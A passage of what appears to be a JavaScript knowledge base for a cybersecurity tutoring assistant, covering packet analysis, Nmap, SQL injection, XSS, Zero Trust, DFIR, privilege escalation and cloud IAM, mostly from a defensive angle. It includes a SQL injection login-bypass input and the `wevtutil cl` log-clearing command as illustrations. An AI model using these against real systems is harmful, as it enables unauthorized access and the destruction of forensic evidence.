      '**Detection Engineering:** Authoring and maintaining Correlation Searches, establishing behavioral baselines to reduce alert fatigue, and configuring summary indexes for high-speed reporting.'
    ],
    defenseAndHardening: [
      '**Log Source Completeness:** Ensure forwarding of all critical logs: Windows Security Logs, PowerShell Script Block Logging (Event 4104), Sysmon, DNS queries, firewall egress, and cloud audit trails.',
      '**Role-Based Access Control (RBAC):** Restrict search head permissions so analysts only access indexes relevant to their operational role.'
    ],
    followUpQuestion: 'Would you like to see an example of a practical SPL hunting query for suspicious process creation, or explore how correlation searches trigger notable events?',
    authorityResource: {
      id: 'auth-splunk',
      title: 'Splunk Documentation: Security Information and Event Management (SIEM) Overview',
      canonicalUrl: 'https://docs.splunk.com/Documentation/ES/latest/User/Overview',
      provider: { name: 'Splunk' },
      resourceType: 'official_doc',
      difficultyLevel: 'intermediate',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'Comprehensive official documentation detailing SIEM correlation searches, incident management, and data models.'
    }
  },

  // 6. Wireshark & Packet Analysis
  {
    id: 'wireshark',
    title: 'Wireshark & Deep Packet Inspection',
    keywords: ['wireshark', 'pcap', 'packet analysis', 'sniffing', 'display filter', 'bpf', 'tshark', 'tcp stream'],
    regex: /\b(wireshark|pcap|packet analysis|packet capture|deep packet inspection|tshark)\b/i,
    role: 'Protocol Dissection, Network Forensics & Malware Traffic Analysis (MTA)',
    overview: 'Wireshark is the world\'s foremost open-source network protocol analyzer. It captures raw packets off network interfaces in real time and dissects hundreds of protocols down to individual bit flags, making it essential for network troubleshooting, forensic investigation, and malware traffic analysis.',
    pillars: [
      '**Capture Engine:** Uses libpcap (Linux/macOS) or Npcap (Windows) to place network adapters into promiscuous mode, capturing all frames passing through the interface.',
      '**Protocol Dissector Tree:** Decodes raw octets into structured, human-readable layers matching the network stack: Frame metadata -> Ethernet (L2) -> IPv4/IPv6 (L3) -> TCP/UDP (L4) -> Application Data (HTTP, DNS, TLS, SMB).',
      '**Filtering Architecture:** Berkeley Packet Filters (BPF) evaluated at capture time (e.g. `net 192.168.1.0/24 and port 53`) vs Display Filters evaluated post-capture (e.g. `http.request.method == "POST" || tcp.flags.reset == 1`).',
      '**TCP Stream Reassembly:** Tracks sequence and acknowledgement numbers to reconstruct full bidirectional conversation streams ("Follow TCP Stream"), allowing analysts to inspect cleartext communication or extract transmitted files directly from the capture.'
    ],
    operationalUse: [
      '**Malware Traffic Analysis (MTA):** Inspecting PCAPs from infected hosts to identify C2 beaconing intervals, uncover DNS tunneling payloads, inspect TLS Server Name Indication (SNI) headers, and carve downloaded malware payloads.',
      '**Incident Response & Protocol Auditing:** Verifying whether sensitive data is being transmitted in unencrypted protocols (HTTP, Telnet, FTP, unencrypted LDAP) and detecting ARP poisoning attacks.'
    ],
    defenseAndHardening: [
      '**Network Hardening Against Sniffing:** Enforce 802.1X port security, enable Dynamic ARP Inspection (DAI), and enforce end-to-end TLS 1.3 encryption so that promiscuous packet sniffing cannot yield cleartext credentials.'
    ],
    followUpQuestion: 'Would you like to see how to filter for specific TCP flags in Wireshark, or explore how to reconstruct a captured file from a PCAP stream?',
    authorityResource: {
      id: 'auth-wireshark',
      title: 'Wireshark User\'s Guide & Official Protocol Dissection Manual',
      canonicalUrl: 'https://www.wireshark.org/docs/wsug_html_chunked/',
      provider: { name: 'Wireshark Foundation' },
      resourceType: 'official_doc',
      difficultyLevel: 'beginner',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'The official reference manual for packet capture configuration, display filter syntax, and network analysis workflows.'
    }
  },

  // 7. Nmap Network Scanner
  {
    id: 'nmap',
    title: 'Nmap (Network Mapper) & Network Reconnaissance',
    keywords: ['nmap', 'port scan', 'port scanning', 'network scan', 'syn scan', 'stealth scan', 'zenmap', 'nse'],
    regex: /\b(nmap|port scan|port scanning|network mapper|syn scan|stealth scan)\b/i,
    role: 'Network Discovery, Port Auditing & Vulnerability Surface Mapping',
    overview: 'Nmap (Network Mapper) is the industry-standard open-source utility for network exploration, host discovery, and vulnerability scanning. It sends specially crafted raw IP packets to target subnets and analyzes the responses to determine active hosts, open ports, service versions, and operating system implementations.',
    pillars: [
      '**TCP SYN Stealth Scan (`-sS`):** Sends a TCP SYN packet. If the port is open, the host replies with SYN-ACK; Nmap immediately transmits a RST packet to tear down the connection before the 3-way handshake finishes. This avoids completing full connections, minimizing application-level logging.',
      '**TCP Connect Scan (`-sT`):** Uses the OS native `connect()` system call to complete the full 3-way handshake. Used when the scan is run without administrative/root privileges required for raw socket manipulation.',
      '**UDP Scanning (`-sU`):** Probes connectionless UDP ports (DNS 53, SNMP 161, NTP 123). If an ICMP "port unreachable" (type 3, code 3) error returns, the port is closed; no response or an application reply classifies the port as open|filtered.',
      '**Service & OS Fingerprinting (`-sV`, `-O`):** Compares packet timing, TCP window sizes, TCP options order, and application banner responses against Nmap\'s signature databases (`nmap-os-db` and `nmap-service-probes`).',
      '**Nmap Scripting Engine (NSE, `-sC`):** Embedded Lua interpreter allowing users to run hundreds of automated scripts for advanced discovery, vulnerability auditing (`--script vuln`), and authentication testing.'
    ],
    operationalUse: [
      '**Defensive Auditing:** Sysadmins and blue teams regularly scan internal networks to discover rogue devices, detect unauthorized listening ports, find exposed administrative interfaces (RDP, SSH, Telnet), and verify firewall rule enforcement.',
      '**Red Team & Pentesting:** The primary reconnaissance phase tool for mapping external and internal attack surfaces prior to exploitation.'
    ],
    defenseAndHardening: [
      '**Detection & Prevention:** Network Intrusion Detection Systems (Snort, Suricata) detect rapid port scans via portscan preprocessors. Configure firewalls to rate-limit ICMP and TCP connection requests, and deploy honeypot decoy ports.'
    ],
    followUpQuestion: 'Would you like to see how different Nmap scan flags affect firewall packet drop rules, or practice scanning a safe local target?',
    authorityResource: {
      id: 'auth-nmap',
      title: 'Nmap Reference Guide & Official Network Exploration Manual',
      canonicalUrl: 'https://nmap.org/book/man.html',
      provider: { name: 'Gordon Lyon (Fyodor) / Nmap.org' },
      resourceType: 'official_doc',
      difficultyLevel: 'beginner',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'The authoritative guide to port scanning techniques, timing options, evasion methods, and NSE scripting.'
    }
  },

  // 8. SQL Injection
  {
    id: 'sqli',
    title: 'SQL Injection (SQLi) & Database Security',
    keywords: ['sql injection', 'sqli', 'union select', 'blind sql', 'sqlmap', 'database injection', 'parameterized queries'],
    regex: /\b(sql injection|sqli|database injection|sqlmap|union select)\b/i,
    role: 'Web Application Security, Data Confidentiality & Database Integrity',
    overview: 'SQL Injection (SQLi) is a critical web application vulnerability that occurs when untrusted user input is directly concatenated into dynamic SQL queries without proper sanitization or parameterization. This allows an attacker to manipulate query structure, bypassing authentication, extracting confidential database records, modifying data, or executing administrative commands.',
    pillars: [
      '**In-Band SQLi (Classic):** The attacker uses the same channel to launch the attack and gather results. Sub-types include **UNION-based** (combining query results with attacker-selected columns via `UNION SELECT`) and **Error-based** (intentionally triggering detailed database error messages that reveal data).',
      '**Inferential SQLi (Blind):** The application does not return data or database errors in the HTTP response. Attackers infer data by asking boolean true/false questions (observing content differences) or **Time-based Blind** queries (forcing the database to pause using `pg_sleep()`, `WAITFOR DELAY`, or `SLEEP()`).',
      '**Out-of-Band SQLi:** Relies on the database server making external DNS or HTTP requests to an attacker-controlled server (e.g. `xp_dirtree` in MSSQL or `UTL_HTTP` in Oracle) to exfiltrate data.',
      '**Root Cause Mechanics:** Flawed code constructs like `"SELECT * FROM users WHERE username = \'" + userInput + "\'"`. If `userInput` is `\' OR \'1\'=\'1\' --`, the boolean condition always evaluates to true, bypassing password checks.'
    ],
    operationalUse: [
      '**AppSec & Blue Team:** Deploying Web Application Firewalls (WAF) to detect common SQL injection signatures, auditing database query logs for syntax error spikes, and performing SAST and DAST scanning across codebases.',
      '**Ethical Penetration Testing:** Identifying injection parameters using proxies (Burp Suite) or authorized testing tools (sqlmap) to demonstrate risk and guide development teams in remediation.'
    ],
    defenseAndHardening: [
      '**Primary Defense - Parameterized Queries (Prepared Statements):** Ensures the database engine always treats user input as literal data parameters, never as executable SQL code, regardless of special characters.',
      '**Defense-in-Depth - Least Privilege Database Accounts:** Never connect web applications to databases using `root`, `sa`, or `DBA` accounts. Restrict application user accounts to only `SELECT`, `INSERT`, `UPDATE` on specific required tables, denying access to system tables and stored procedures.'
    ],
    followUpQuestion: 'Would you like to see how parameterized queries block SQL injection at the compiler level, or practice with a safe, legal lab on PortSwigger Web Security Academy?',
    authorityResource: {
      id: 'auth-sqli',
      title: 'PortSwigger Web Security Academy: SQL Injection Explaining & Interactive Labs',
      canonicalUrl: 'https://portswigger.net/web-security/sql-injection',
      provider: { name: 'PortSwigger' },
      resourceType: 'interactive_lab',
      difficultyLevel: 'beginner',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'The premier free web security curriculum explaining SQL injection types with hands-on vulnerable browser labs.'
    }
  },

  // 9. Cross-Site Scripting (XSS)
  {
    id: 'xss',
    title: 'Cross-Site Scripting (XSS) & Browser Security',
    keywords: ['cross site scripting', 'xss', 'stored xss', 'reflected xss', 'dom xss', 'content security policy', 'csp'],
    regex: /\b(cross site scripting|xss|stored xss|reflected xss|dom xss|dom-based xss)\b/i,
    role: 'Web Client-Side Security & Session Integrity Protection',
    overview: 'Cross-Site Scripting (XSS) is a client-side code injection vulnerability that allows an attacker to execute arbitrary JavaScript within the browser session of a legitimate user. Because the browser trusts scripts originating from the application\'s domain, malicious code can steal session tokens, capture keystrokes, deface pages, or perform unauthorized actions on the user\'s behalf.',
    pillars: [
      '**Stored XSS (Persistent):** The malicious payload is permanently stored in the target application\'s database (e.g. in a comment section, user profile bio, or forum post). Every time a victim loads the page, the browser downloads and executes the injected script.',
      '**Reflected XSS (Non-Persistent):** The malicious payload is included in a URL parameter or link. The server reflects the payload directly into the HTTP response body without proper encoding. Victims are tricked into clicking the link via phishing.',
      '**DOM-based XSS:** The vulnerability exists purely within client-side JavaScript. Untrusted data from a client-side source (such as `location.search`, `document.referrer`, or `window.name`) flows into an unsafe execution sink (such as `eval()`, `innerHTML`, or `document.write`) without ever passing through the backend server.',
      '**Exploitation Impact:** Stealing authentication session cookies (`document.cookie`), capturing passwords with injected fake login modals, or pivoting to access internal intranets via the victim\'s authenticated browser session.'
    ],
    operationalUse: [
      '**AppSec Engineers:** Implementing automated browser security headers, reviewing front-end JavaScript frameworks (React, Angular) which automatically encode output, and running SAST/DAST tooling.'
    ],
    defenseAndHardening: [
      '**Context-Aware Output Encoding:** Encode untrusted data before rendering it in HTML body, HTML attributes, or JavaScript contexts, neutralizing script tags.',
      '**Content Security Policy (CSP):** Deploy the `Content-Security-Policy` HTTP header with strict directives (e.g., `script-src \'self\' \'nonce-...\'`), preventing the execution of inline scripts and unauthorized external domains.',
      '**HttpOnly Session Cookies:** Mark sensitive authentication cookies with the `HttpOnly` and `SameSite=Strict` flags. This prevents client-side JavaScript from accessing session cookies via `document.cookie`.'
    ],
    followUpQuestion: 'Would you like to see how Content Security Policy (CSP) headers block XSS execution, or explore the difference between Reflected and DOM-based XSS?',
    authorityResource: {
      id: 'auth-xss',
      title: 'OWASP Cross-Site Scripting (XSS) Prevention Cheat Sheet',
      canonicalUrl: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html',
      provider: { name: 'OWASP' },
      resourceType: 'cheatsheet',
      difficultyLevel: 'beginner',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'Official OWASP guidance detailing rule-by-rule context-aware encoding, safe sinks, and CSP deployment.'
    }
  },

  // 10. Zero Trust Architecture
  {
    id: 'zero_trust',
    title: 'Zero Trust Architecture (ZTA)',
    keywords: ['zero trust', 'zta', 'nist sp 800-207', 'never trust always verify', 'microsegmentation', 'least privilege access', 'ztna'],
    regex: /\b(zero trust|zta|zero trust architecture|nist sp 800-207|ztna|never trust always verify)\b/i,
    role: 'Modern Enterprise Security Strategy & Identity-Centric Perimeter Replacement',
    overview: 'Zero Trust Architecture (ZTA) is a strategic cybersecurity paradigm based on the principle of \'Never Trust, Always Verify\'. Codified in NIST SP 800-207, it eliminates implicit trust granted to devices and users based solely on their physical or network location inside a corporate intranet, treating all network traffic as potentially hostile.',
    pillars: [
      '**Continuous Identity & Context Validation:** Every access request is dynamically authenticated and authorized based on multiple context attributes: user identity, multi-factor authentication status, device health compliance, geographic location, and real-time behavioral risk scores.',
      '**Least Privilege Access (Just-In-Time & Just-Enough):** Users and services receive only the minimal permissions required for their immediate task, granted temporarily and revoked immediately upon task completion.',
      '**Assume Breach Mindset:** Assumes adversaries already operate within the network. Defense focuses on minimizing the blast radius through granular network microsegmentation, end-to-end encryption for all data in transit and at rest, and pervasive telemetry logging.',
      '**Logical Architecture (NIST SP 800-207):** Centered around a Policy Decision Point (PDP) comprising the Policy Engine (evaluates access rules) and Policy Administrator (issues credentials/tokens), communicating with Policy Enforcement Points (PEP) (gateways that intercept and permit/deny traffic).'
    ],
    operationalUse: [
      '**Enterprise Security Architects:** Replacing legacy flat VPNs with Zero Trust Network Access (ZTNA) solutions, deploying Identity Providers (IdP) with conditional access policies, and segmenting workloads across hybrid multi-cloud environments.',
      '**SOC Analysts:** Correlating contextual identity alerts (e.g. impossible travel, unmanaged device connecting to production database) to stop compromised credentials early.'
    ],
    defenseAndHardening: [
      '**Phishing-Resistant MFA:** Deploy FIDO2 / WebAuthn hardware security keys for all enterprise access.',
      '**Device Posture Checking:** Require endpoint compliance checks (EDR agent running, disk encrypted, OS patched) before granting access to enterprise resources.'
    ],
    followUpQuestion: 'Would you like to see how conditional access policies enforce device health checks, or explore microsegmentation architectures?',
    authorityResource: {
      id: 'auth-zero-trust',
      title: 'NIST SP 800-207: Zero Trust Architecture Standard',
      canonicalUrl: 'https://csrc.nist.gov/publications/detail/sp/800-207/final',
      provider: { name: 'NIST' },
      resourceType: 'official_doc',
      difficultyLevel: 'intermediate',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'The foundational NIST standard defining Zero Trust tenets, logical components, and deployment models.'
    }
  },

  // 11. Honeypots & Deception
  {
    id: 'honeypots',
    title: 'Honeypots, Deception Technology & Honeytokens',
    keywords: ['honeypot', 'honeypots', 'deception technology', 'honeytoken', 'canarytokens', 'honeynet', 'cowrie', 'dionaea'],
    regex: /\b(honeypots?|deception technology|honeytokens?|canarytokens?|honeynets?)\b/i,
    role: 'High-Fidelity Threat Detection, Adversary Intelligence & Deception Defense',
    overview: 'Honeypots and deception technology are intentionally deployed decoy systems, services, credentials, or files designed to detect, divert, and study unauthorized adversary activity. Because legitimate employees have no valid business reason to interact with decoy assets, any interaction generates a virtually zero false-positive high-fidelity security alert.',
    pillars: [
      '**Low-Interaction Honeypots (e.g. Cowrie, Dionaea):** Emulates specific network services and ports (such as SSH, Telnet, or SMB) without running full operating systems. Safe to operate, resource-light, and excellent for harvesting automated scanning intelligence, attacker IP addresses, and brute-force credentials.',
      '**High-Interaction Honeypots:** Deploys real operating systems and production applications inside strictly isolated sandbox environments. Allows defenders to observe live manual adversary tradecraft, zero-day exploits, rootkits, and lateral movement in depth.',
      '**Honeytokens & Canary Objects:** Decoy artifacts embedded in production environments—such as fake AWS API keys (Canarytokens), inactive high-privilege Active Directory user accounts, fake database tables with decoy credit cards, or juicy documents on shared drives.',
      '**Honeynets & Decoy Subnets:** Entire virtual subnets populated with interconnected decoy servers designed to trap adversaries post-lateral movement.'
    ],
    operationalUse: [
      '**SOC & Incident Response:** Generating immediate P1 critical alerts when a honeytoken or honeypot is touched, allowing defenders to isolate the compromised endpoint within minutes before data exfiltration occurs.',
      '**Cyber Threat Intelligence (CTI):** Analyzing attacker payloads, command histories, and botnet propagation techniques collected by Internet-facing honeypots.'
    ],
    defenseAndHardening: [
      '**Containment & Isolation:** Ensure honeypots reside in segmented VLANs with strict outbound egress filtering to prevent attackers from using the honeypot as a launchpad to attack real internal systems.'
    ],
    followUpQuestion: 'Would you like to explore how to generate decoy Canarytokens, or see how to set up an isolated Cowrie SSH honeypot?',
    authorityResource: {
      id: 'auth-honeypots',
      title: 'SANS Institute: Deception Technology, Honeytokens, and Enterprise Early Warning',
      canonicalUrl: 'https://www.sans.org/white-papers/37920/',
      provider: { name: 'SANS Institute' },
      resourceType: 'official_doc',
      difficultyLevel: 'intermediate',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'Practical architectural guide to deploying honeytokens and deception systems for threat detection.'
    }
  },

  // 12. DFIR
  {
    id: 'dfir',
    title: 'Digital Forensics & Incident Response (DFIR)',
    keywords: ['dfir', 'digital forensics', 'incident response', 'memory forensics', 'disk forensics', 'chain of custody', 'order of volatility', 'volatility'],
    regex: /\b(dfir|digital forensics|incident response|memory forensics|disk forensics|volatility framework|order of volatility)\b/i,
    role: 'Cyber Intrusion Containment, Root-Cause Eradication & Digital Evidence Preservation',
    overview: 'Digital Forensics and Incident Response (DFIR) is the specialized cybersecurity practice of detecting, containing, investigating, and recovering from cyber intrusions while preserving digital evidence according to legal and forensic standards.',
    pillars: [
      '**Incident Response Lifecycle (NIST SP 800-61 / SANS PICERL):** Follows six systematic phases: Preparation (tools, runbooks) -> Identification (detecting and validating the breach) -> Containment (isolating hosts, revoking keys) -> Eradication (removing malware, persistence) -> Recovery (restoring clean systems) -> Lessons Learned (post-incident report).',
      '**Order of Volatility (RFC 3227):** Evidence must be collected in order of highest volatility to lowest: CPU registers & cache -> Routing tables, ARP cache, active network connections, RAM -> Temporary file systems -> Hard disks & permanent storage -> Network topology -> Archival backup media.',
      '**Memory Forensics (RAM Analysis):** Analyzing captured volatile memory using tools like Volatility or Rekall. Reveals running processes, unencrypted C2 network sockets, injected DLLs, unencrypted encryption keys, and in-memory fileless malware.',
      '**Disk & Filesystem Forensics:** Parsing Master File Tables ($MFT), Shimcache / Amcache (proving executable execution), Windows Prefetch files, Event Logs, and UserAssist registry keys to construct an exact second-by-second timeline of attacker actions.'
    ],
    operationalUse: [
      '**Incident Responders:** Rapidly scoping enterprise ransomware or APT incidents, determining initial access vectors, identifying compromised user accounts, and safely restoring operations.',
      '**Forensic Analysts:** Maintaining cryptographic hashes (SHA-256) of bitstream disk images (FTK Imager, dd) and documenting strict Chain of Custody forms for court admissibility.'
    ],
    defenseAndHardening: [
      '**Centralized Logging:** Ingest forensic telemetry in real time to secure SIEMs so attackers cannot eliminate evidence by clearing local Windows event logs (`wevtutil cl`).'
    ],
    followUpQuestion: 'Would you like to see how to analyze a memory dump with Volatility, or explore how to parse Windows $MFT and Prefetch files?',
    authorityResource: {
      id: 'auth-dfir',
      title: 'NIST SP 800-61 Rev. 2: Computer Security Incident Handling Guide',
      canonicalUrl: 'https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final',
      provider: { name: 'NIST' },
      resourceType: 'official_doc',
      difficultyLevel: 'intermediate',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'The universally recognized federal framework for building an incident response capability and handling breaches.'
    }
  },

  // 13. Privilege Escalation
  {
    id: 'privesc',
    title: 'Privilege Escalation (PrivEsc) Mechanics',
    keywords: ['privilege escalation', 'privesc', 'local privilege escalation', 'lpe', 'suid', 'sudo -l', 'seimpersonateprivilege', 'unquoted service paths'],
    regex: /\b(privilege escalation|privesc|local privilege escalation|lpe|suid|seimpersonateprivilege)\b/i,
    role: 'Post-Exploitation Adversary Tactic & Operating System Security Hardening',
    overview: 'Privilege Escalation occurs when an adversary or authorized tester abuses a bug, design flaw, or configuration oversight in an operating system or software application to gain elevated access permissions (such as root on Linux or NT AUTHORITY\\SYSTEM / Domain Admin on Windows) beyond their initial low-privilege foothold.',
    pillars: [
      '**Windows Privilege Escalation Vectors:** Abusing Windows user rights (e.g. `SeImpersonatePrivilege` via Potato exploits like JuicyPotato/PrintSpoofer), exploiting unquoted service paths with spaces, DLL search order hijacking, weak registry permissions on service definitions, or harvesting cleartext credentials from memory via `lsass.exe`.',
      '**Linux Privilege Escalation Vectors:** Misconfigured SUID/SGID binaries allowing command execution (documented in GTFOBins), overly permissive `sudoers` configurations (`sudo -l` allowing execution of binaries as root without password), writable cron jobs, wildcards in shell scripts (`*` expansion in `tar`), or local kernel exploits (e.g. Dirty COW, Dirty Pipe).',
      '**Token Impersonation & Duplication:** Under Windows security architecture, services running as service accounts can duplicate client security tokens to impersonate users, which can be hijacked if services run with excessive privileges.',
      '**Horizontal vs Vertical Escalation:** Vertical escalation involves elevating privileges to a higher security tier (user to admin); Horizontal escalation involves accessing accounts and data belonging to peer users at the same privilege level.'
    ],
    operationalUse: [
      '**SOC Analysts & EDR Monitoring:** Monitoring endpoint telemetry for anomalous privilege tokens being enabled, unexpected child processes spawned by system services, and modifications to sensitive system directories (`C:\\Windows\\System32` or `/etc/sudoers`).',
      '**Red Teamers:** Performing internal privilege auditing using scripts like WinPEAS, LinPEAS, or Seatbelt in authorized penetration test engagements.'
    ],
    defenseAndHardening: [
      '**Principle of Least Privilege:** Never run applications or services as `SYSTEM` or `root` unless strictly required.',
      '**Audit SUID & File Permissions:** Regularly scan Linux systems for unapproved SUID binaries (`find / -perm -4000 2>/dev/null`) and enforce read-only permissions on sensitive configurations.'
    ],
    followUpQuestion: 'Would you like to explore how Windows token impersonation works with Potato exploits, or see how to audit Linux SUID binaries?',
    authorityResource: {
      id: 'auth-privesc',
      title: 'MITRE ATT&CK: Privilege Escalation Tactics & Techniques (TA0004)',
      canonicalUrl: 'https://attack.mitre.org/tactics/TA0004/',
      provider: { name: 'MITRE' },
      resourceType: 'official_doc',
      difficultyLevel: 'intermediate',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'Comprehensive catalog of real-world adversary privilege escalation techniques, procedures, and mitigation strategies.'
    }
  },

  // 14. MITRE ATT&CK
  {
    id: 'mitre_attack',
    title: 'MITRE ATT&CK Framework & Threat Emulation',
    keywords: ['mitre attack', 'mitre att&ck', 'tactics techniques', 'ttps', 'adversary emulation', 'atomic red team'],
    regex: /\b(mitre att&ck|mitre attack|adversary emulation|atomic red team|ttp|ttps)\b/i,
    role: 'Threat Intelligence Taxonomy, Adversary Modeling & Detection Engineering',
    overview: 'The MITRE ATT&CK (Adversary Tactics, Techniques, and Common Knowledge) framework is a globally accessible, curated knowledge base of real-world cyber adversary behavior based on observations of thousands of actual cyber attacks. It provides a common language for describing and categorizing threat actions across the entire intrusion lifecycle.',
    pillars: [
      '**Hierarchical Structure:** Organized into Tactics (the adversary\'s tactical goal, the \'Why\', e.g. Initial Access, Persistence, Defense Evasion, Lateral Movement), Techniques (the technical mechanism used, the \'How\', e.g. T1059 Command and Scripting Interpreter), and Sub-techniques (specific variations, e.g. T1059.001 PowerShell).',
      '**Procedures:** The documented real-world implementations used by specific Advanced Persistent Threat (APT) groups (e.g. how APT29 uses PowerShell versus how FIN7 uses it).',
      '**Matrices:** Spans Enterprise (Windows, macOS, Linux, Cloud, Identity), Mobile (iOS, Android), and ICS (Industrial Control Systems).',
      '**Data Sources & Mitigations:** Each technique is mapped directly to recommended telemetry sources required to detect it (e.g. Process Creation Event 4688) and architectural mitigations (M1038 Execution Prevention).'
    ],
    operationalUse: [
      '**Detection Engineers:** Performing coverage gap analysis by mapping existing SIEM/EDR detection rules against the ATT&CK matrix to identify blind spots.',
      '**Purple Teaming:** Collaborating between red and blue teams using open-source adversary emulation frameworks like Atomic Red Team or Caldera to run scripted unit tests for specific techniques and validate alerting pipelines.'
    ],
    defenseAndHardening: [
      '**Continuous Validation:** Regularly execute automated attack simulations to ensure that logging infrastructure, EDR agents, and SIEM parsers remain operational across OS upgrades.'
    ],
    followUpQuestion: 'Would you like to see how to run an Atomic Red Team simulation to test a specific technique, or map your alert rules to the matrix?',
    authorityResource: {
      id: 'auth-mitre-attack',
      title: 'MITRE ATT&CK Enterprise Matrix & Official Documentation',
      canonicalUrl: 'https://attack.mitre.org/',
      provider: { name: 'MITRE' },
      resourceType: 'official_doc',
      difficultyLevel: 'beginner',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'The industry-standard reference taxonomy for adversary techniques, threat groups, and defensive detection mapping.'
    }
  },

  // 15. Cloud Security & IAM
  {
    id: 'cloud_iam',
    title: 'Cloud Security Posture & Identity Access Management (IAM)',
    keywords: ['cloud security', 'aws security', 'azure security', 'cloud iam', 'shared responsibility model', 'cspm', 'imds', 's3 bucket'],
    regex: /\b(cloud security|aws security|azure security|cloud iam|shared responsibility model|cspm|imds)\b/i,
    role: 'Cloud Infrastructure Protection, Workload Security & Identity Governance',
    overview: 'Cloud Security encompasses the policies, controls, technologies, and services deployed to protect cloud data, applications, virtual machines, containers, and serverless architectures across public, private, and hybrid cloud environments (AWS, Microsoft Azure, Google Cloud Platform).',
    pillars: [
      '**Shared Responsibility Model:** The cloud provider manages security OF the cloud (physical data centers, hardware, hypervisors, and core networking); the customer is responsible for security IN the cloud (data classification, IAM policies, operating system patches, firewall rules, and encryption keys).',
      '**Cloud IAM (Identity and Access Management):** The primary security perimeter in cloud computing. Enforces authentication, role assumption, service accounts, and fine-grained JSON policy definitions governing which identities can invoke specific API actions on cloud resources.',
      '**Instance Metadata Service (IMDS):** The internal HTTP service (169.254.169.254) accessible by compute instances. Attackers targeting SSRF vulnerabilities on cloud workloads exploit legacy IMDSv1 to harvest temporary STS credentials; modern environments enforce session-oriented IMDSv2.',
      '**Cloud Security Posture Management (CSPM):** Continuous automated auditing tools that inspect cloud configurations against benchmarks (CIS Cloud Benchmarks) to detect public storage buckets, unencrypted databases, and overprivileged roles.'
    ],
    operationalUse: [
      '**DevSecOps & Cloud Engineers:** Implementing Infrastructure as Code (IaC) scanning (Checkov, tfsec) within CI/CD pipelines to block misconfigured Terraform/CloudFormation templates before deployment.',
      '**Cloud Incident Responders:** Investigating cloud audit logs (AWS CloudTrail, Azure Activity Log, GCP Cloud Audit Logs) to detect unauthorized IAM role creation, anomalous API calls, and mass data downloads.'
    ],
    defenseAndHardening: [
      '**Enforce IMDSv2 & Least Privilege IAM:** Require IMDSv2 token headers across all compute instances. Never grant wildcard permissions (`*`) in IAM policies; apply conditions (e.g. source IP, MFA requirement).'
    ],
    followUpQuestion: 'Would you like to see an example of an overprivileged AWS IAM policy and how to restrict it, or explore IMDSv2 protections?',
    authorityResource: {
      id: 'auth-cloud-iam',
      title: 'Center for Internet Security (CIS) Cloud Benchmarks',
      canonicalUrl: 'https://www.cisecurity.org/cis-benchmarks',
      provider: { name: 'CIS' },
      resourceType: 'official_doc',
      difficultyLevel: 'intermediate',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'Prescriptive, consensus-based security baselines for configuring AWS, Azure, and Google Cloud environments safely.'
    }
  },

  // 16. Cryptography & PKI
  {
    id: 'cryptography_pki',
    title: 'Cryptography, Hashing & Public Key Infrastructure (PKI)',
    keywords: ['cryptography', 'encryption', 'pki', 'public key infrastructure', 'aes', 'rsa', 'tls', 'sha-256', 'digital certificate'],
    regex: /\b(cryptography|encryption|pki|public key infrastructure|symmetric encryption|asymmetric encryption|digital certificates?|x\.509)\b/i,
    role: 'Confidentiality, Integrity, Non-Repudiation & Cryptographic Identity',
    overview: 'Cryptography is the mathematical foundation of information security, providing confidentiality (encryption), integrity (cryptographic hashing), authentication (digital signatures), and non-repudiation across digital communication systems. Public Key Infrastructure (PKI) manages the digital certificates that bind public keys to identities.',
    pillars: [
      '**Symmetric Encryption (Single Secret Key):** The same key encrypts and decrypts data. Standards include AES-GCM (Galois/Counter Mode for authenticated encryption) and ChaCha20-Poly1305. Extremely fast, used for bulk data at rest and in transit.',
      '**Asymmetric Encryption (Key Pairs):** Uses mathematically linked public and private keys (RSA, Elliptic Curve Cryptography / ECC). The public key encrypts data or verifies signatures; the private key decrypts data or generates signatures. Used for secure key exchange and digital identity.',
      '**Cryptographic Hashing:** One-way mathematical functions generating a fixed-size digest (SHA-256, SHA-3) with pre-image resistance and collision resistance. For passwords, specialized memory-hard slow functions are mandatory (Argon2id, bcrypt, PBKDF2) to resist GPU brute-force attacks.',
      '**Public Key Infrastructure (PKI) & X.509:** Hierarchies of Certificate Authorities (Root CA, Intermediate CA) that sign digital certificates containing public keys, domain names, and expiration dates. Enables TLS 1.3 to authenticate servers and establish ephemeral session keys via Diffie-Hellman (ECDHE).'
    ],
    operationalUse: [
      '**Security Engineers:** Managing corporate Certificate Authorities, implementing automated certificate renewal (ACME protocol), enforcing TLS 1.3 with forward secrecy, and auditing cipher suites to eliminate obsolete algorithms (DES, 3DES, RC4, MD5, SHA-1).'
    ],
    defenseAndHardening: [
      '**Deprecate Legacy Ciphers:** Completely disable SSL 3.0, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 with AES-256-GCM or ChaCha20.'
    ],
    followUpQuestion: 'Would you like to explore how TLS 1.3 establishes forward secrecy with ECDHE, or see how password hashing algorithms like Argon2id protect against GPU cracking?',
    authorityResource: {
      id: 'auth-crypto-pki',
      title: 'NIST Special Publication 800-57: Recommendation for Key Management',
      canonicalUrl: 'https://csrc.nist.gov/publications/detail/sp/800-57-part-1/rev-5/final',
      provider: { name: 'NIST' },
      resourceType: 'official_doc',
      difficultyLevel: 'intermediate',
      provenance: { origin: 'internal_index' },
      whyRecommended: 'The authoritative cryptographic standard covering algorithm lifetimes, key lengths, and management best practices.'
    }
  },

  // 17. Malware Analysis
  {
    id: 'malware_analysis',
    title: 'Malware Analysis & Reverse Engineering',
    keywords: ['malware analysis', 'reverse engineering', 'ghidra', 'ida pro', 'static analysis', 'dynamic analysis', 'sandbox analysis', 'pe header'],
    regex: /\b(malware analysis|reverse engineering|static analysis|dynamic analysis|ghidra|ida pro|disassembler|pe header)\b/i,
    role: 'Threat Triage, Binary Dissection & Indicator of Compromise (IOC) Extraction',
